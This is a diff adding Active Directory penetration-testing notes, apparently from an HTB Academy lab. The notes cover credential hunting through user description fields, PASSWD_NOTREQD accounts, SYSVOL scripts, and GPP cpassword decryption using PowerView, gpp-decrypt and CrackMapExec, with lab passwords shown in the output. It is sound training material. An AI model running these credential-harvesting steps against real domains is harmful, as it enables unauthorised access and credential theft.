@@ -10,6 +10,7 @@
     - [MS14-068](#ms14-068)
     - [Sniffing LDAP Credentials](#sniffing-ldap-credentials)
     - [Enumerating DNS Records](#enumerating-dns-records)
+    - [Other Misconfigurations](#other-misconfigurations)
 
 
 
@@ -286,3 +287,125 @@ Password:
 [+] Found 27 records
 
 ```
+
+
+## Other Misconfigurations
+- **Password in Description Field**
+    - Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.
+
+```powershell
+# Finding Passwords in the Description Field using Get-Domain User
+PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+samaccountname description
+-------------- -----------
+administrator  Built-in account for administering the computer/domain
+guest          Built-in account for guest access to the computer/domain
+krbtgt         Key Distribution Center Service Account
+ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
+```
+
+- **PASSWD_NOTREQD Field**
+    - If this field is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain).
+    - It is worth enumerating accounts with this flag set and testing each to see if no password is required
+
+```powershell
+# Checking for PASSWD_NOTREQD Setting using Get-DomainUser
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+samaccountname                                                         useraccountcontrol
+--------------                                                         ------------------
+guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+
+- **Credentials in SMB Shares and SYSVOL Scripts**
+    - The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain.
+
+```powershell
+# Discovering an Interesting Script
+PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+
+Mode                LastWriteTime         Length Name                                                                 
+----                -------------         ------ ----                                                                 
+-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
+-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
+-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
+-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
+
+# Finding a Password in the Script
+
+PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+
+On Error Resume Next
+strComputer = "."
+ 
+Set oShell = CreateObject("WScript.Shell") 
+sUser = "Administrator"
+sPwd = "!ILFREIGHT_L0cALADmin!"
+ 
+Set Arg = WScript.Arguments
+If  Arg.Count > 0 Then
+sPwd = Arg(0) 'Pass the password as parameter to the script
+End if
+ 
+'Get the administrator name
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+<SNIP>
+```
+- **Group Policy Preferences (GPP) Passwords**
+    - When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+        - Map drives (drives.xml)
+        - Create local users
+        - Create printer config files (printers.xml)
+        - Creating and updating services (services.xml)
+        - Creating scheduled tasks (scheduledtasks.xml)
+        - Changing local admin passwords.
+
+    - These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. 
+    - Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+    - This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. 
+    - The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+
+    - The XML looks like the following: 
+    ![GPP](/images/GPP.jpg)
+
+    - GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value.
+    ```bash
+    # Decrypting the Password with gpp-decrypt
+    gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+
+    Password1
+    ```
+    - CrackMapExec also has two modules for locating and retrieving GPP passwords.
+    ```bash
+    # Locating & Retrieving GPP Passwords with CrackMapExec
+    crackmapexec smb -L | grep gpp
+
+    [*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+    [*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+
+    # Using CrackMapExec gpp_autologin Module
+
+    crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+    SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+    SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+    GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+
+
+    ```
+
